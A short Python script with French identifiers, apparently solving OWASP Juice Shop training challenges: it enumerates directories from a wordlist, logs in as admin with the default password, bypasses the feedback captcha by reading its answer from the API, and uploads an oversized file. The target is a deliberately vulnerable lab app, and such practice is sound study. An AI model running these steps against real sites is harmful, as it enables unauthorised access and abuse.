import requests
import json
site = "MON_SITE"

liste_mots_cles = "liste.txt"
fichier = open(liste_mots_cles, "r")
contenu = fichier.read()
chaque_dossier = contenu.splitlines()
fichier.close()

for dossier in chaque_dossier:
    url = site + dossier
    reponse = requests.get(url)
    if not "Copyright" in reponse.text:
        print("Dossier trouvé : " + url)

session = requests.Session()

login = session.post(site + "/rest/user/login", headers={"Content-Type": "application/json"},
                    data='{"email":"admin@juice-sh.op", "password":"admin123"}')
if not login.ok:
    print("Erreur login")
else:
    print("Login Admin ok")

pageavis = session.get(site + "/rest/captcha")
# print(pageavis.text)
captchainfos=json.loads(pageavis.text)
captchaid=captchainfos["captchaId"]
captcharep=captchainfos["answer"]
# print(str(captchaid) + " " + captcharep)
avis=session.post(site + "/api/Feedbacks", headers={"Content-Type": "application/json"},
                    data='{"captchaId":' + str(captchaid) + ',"captcha":"' + captcharep + '","comment":"lol", "rating":"0"}')
if not avis.ok:
    print("Erreur publication avis")
else:
    print("Publication Avis 0 etoile ok")

fichier = open("a_uploader.txt", "wb")
fichier.truncate(1024*151)
fichier.close()

fichier = open("a_uploader.txt", "rb")
upload = session.post(site + "/file-upload", files={"file":("nom", fichier.read(), "application/json")})
if not upload.ok:
    print("Erreur upload")
else:
    print("Upload fichier volumineux ok")
